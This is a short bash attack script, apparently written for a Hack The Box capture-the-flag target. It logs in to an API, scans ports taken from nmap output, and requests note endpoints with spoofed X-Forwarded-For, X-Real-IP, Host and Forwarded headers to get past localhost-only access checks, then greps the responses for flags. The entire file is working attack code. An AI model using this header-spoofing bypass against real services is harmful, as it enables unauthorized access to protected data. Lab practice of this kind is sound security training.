#!/usr/bin/env bash
set -euo pipefail
IP=${1:-94.237.49.23}
NMAP_FILE=${2:-/workspace/recon/nmap/tcp_full.nmap}
TO=8
OUT_DIR=/workspace/recon/httpx
TMP_DIR=/workspace/recon/tmp
API_PORT=41412
API_BASE="http://$IP:$API_PORT"
mkdir -p "$OUT_DIR" "$TMP_DIR"
# Ensure we have a token
if [[ ! -s "$OUT_DIR/login_resp.json" ]]; then
  curl -fsS -m 8 --connect-timeout 8 -H 'Content-Type: application/json' -d '{"email":"a@a.com","password":"a"}' "$API_BASE/api/auth/login" > "$OUT_DIR/login_resp.json"
fi
TOKEN=$(jq -r .token "$OUT_DIR/login_resp.json")
# Candidate ports
PORTS=$(awk '/\/tcp\s+open\s+.*http/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
PORTS="$PORTS 41411 41412 41417 46132 48544 48656 50692 52548 54991 57280 57759"
# Try header-bypass for /api/notes/all and /api/notes
: > "$OUT_DIR/bypass_hits.txt"
for p in $PORTS; do
  for path in /api/notes/all /api/notes; do
    URL="http://$IP:$p$path"
    RES=$(curl -fsS -m "$TO" --connect-timeout "$TO" -i -H "Authorization: Bearer $TOKEN" \
      -H 'X-Forwarded-For: 127.0.0.1' \
      -H 'X-Real-IP: 127.0.0.1' \
      -H 'Host: localhost' \
      -H 'Forwarded: for=127.0.0.1;host=localhost;proto=http' \
      "$URL" 2>/dev/null || true)
    printf '%s\n' "$RES" | head -n 40 > "$OUT_DIR/bypass_${p}_$(echo "$path"|tr -cd 'A-Za-z0-9').head"
    printf '%s\n' "$RES" | rg -n "HTB\{[^}]+\}" -S >> "$OUT_DIR/bypass_hits.txt" || true
    sleep 0.1
  done
done
sed -n '1,200p' "$OUT_DIR/bypass_hits.txt" || true
